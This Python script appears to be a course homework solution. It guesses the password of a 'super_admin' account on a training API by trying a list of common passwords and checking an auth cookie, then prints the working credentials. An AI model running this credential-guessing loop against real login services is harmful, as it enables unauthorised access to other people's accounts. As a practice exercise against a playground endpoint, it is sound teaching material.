import requests

LOGIN = "super_admin"
WIKI_PASSWORDS_2019 = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345",
                       "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin",
                       "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888",
                       "princess", "dragon", "password1", "123qwe"]
AUTHORIZED_PHRASE = "You are authorized"


def hack_it(password_list):
    for password_in_list in password_list:
        payloads = {
            "login": LOGIN,
            "password": password_in_list
        }
        response_from_pass = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                                           data=payloads)
        cookies = dict(response_from_pass.cookies)
        response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
                                 cookies=cookies)
        if response.text == AUTHORIZED_PHRASE:
            return password_in_list, response.text
    raise Exception("No correct password in the list")


password, secret_phrase = hack_it(WIKI_PASSWORDS_2019)
print(f"Creds: {LOGIN} / {password}")
print(f"Secret phrase: {secret_phrase}")
